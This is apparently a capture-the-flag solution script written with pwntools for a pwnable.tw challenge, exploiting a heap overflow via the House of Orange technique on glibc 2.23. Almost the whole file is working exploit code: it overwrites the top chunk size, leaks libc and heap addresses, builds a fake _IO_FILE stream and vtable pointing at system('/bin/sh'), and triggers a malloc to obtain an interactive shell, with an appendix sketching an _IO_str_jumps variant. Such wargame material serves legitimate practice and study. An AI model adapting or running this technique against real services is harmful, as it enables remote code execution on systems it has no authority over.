###house of orange

from pwn import *

###Utils
def create(size,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('page :',str(size))
    r.sendafter('Content :',data)

def show(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('page :',str(idx))
    res = r.recvuntil('--------')[:-8].strip()
    return res

def edit(idx,data):
    r.sendlineafter('choice :','3')
    r.sendlineafter('page :',str(idx))
    r.sendafter('Content:',data)

def info():
    r.sendlineafter('choice :','4')
    res = r.recvuntil('Page :')[:-6].strip()
    r.sendlineafter('(yes:1 / no:0) ','0')
    return res

def get_shell():
    r.sendlineafter('choice :','1')
    r.sendlineafter('page :',str(0x100))
    r.interactive()

###Useful addr
#  libc2.23
main_arena_offset = 0x3c3b20
IO_list_all_offset = 0x3c4520
system_offset = 0x45390

###Exploit
#  House of orange
r = remote('chall.pwnable.tw',10304)
r.sendafter('Author :','M30W'*16)

###Hijack top_chunk size
create(0xf8,'a'*0xf8)   #0
edit(0,b'a'*0xf8)
edit(0,b'a'*0xf8+b'\x01\x0f\x00')

###invoke free_int + leak libc
create(0x1000,'a')      #1
create(0xf8,'a'*8)     #2
unsorted_bin_addr = u64(show(2).strip()[-6:].ljust(8,b'\x00'))
libc_base = unsorted_bin_addr-main_arena_offset-205*8   #small_bin200 -> 205

###Leak heap (no zero terminate in author)
#  Leaking heap is not necessary
#  See Appendix for more into this
heap_addr = u64((info().split(b'M30W'*16)[1]).ljust(8,b'\x00'))-0x10

vtable_addr = heap_addr+0x100*8+0x100
IO_list_all_addr = IO_list_all_offset+libc_base
system_addr = system_offset+libc_base

###Fake file stream
padding = b'\x00'*0x7f0
stream  = b'/bin/sh\x00'+p64(0x61)+p64(0)+p64(IO_list_all_addr-0x10)
stream += p64(0)+p64(1)
stream  = stream.ljust(0xd8,b'\x00')
stream += p64(vtable_addr)
stream  = stream.ljust(0x100,b'\x00')
vtable  = p64(0)*3+p64(system_addr)
payload = padding+stream+vtable

###Mallocing 9 blocks(size can be faked due to strlen)
edit(0,'\x00')
for i in range(6):
    create(0xf8,b'\x00') #3~#8

###Write fake file stream onto heap
edit(0,payload)

###Malloc to get shell
get_shell()



###Appendix
#  _IO_str_jumps = libc_base + 0x3c27a0
#  from FILE import *
#  context.arch = 'amd64'
#  fake_file = IO_FILE_plus_struct()
#  fake_file._flags = 0
#  fake_file._IO_read_ptr = 0x61
#  fake_file._IO_read_base =_IO_list_all-0x10
#  fake_file._IO_buf_base = binsh
#  fake_file._mode = 0
#  fake_file._IO_write_base = 0
#  fake_file._IO_write_ptr = 1
#  fake_file.vtable = _IO_str_jumps-8
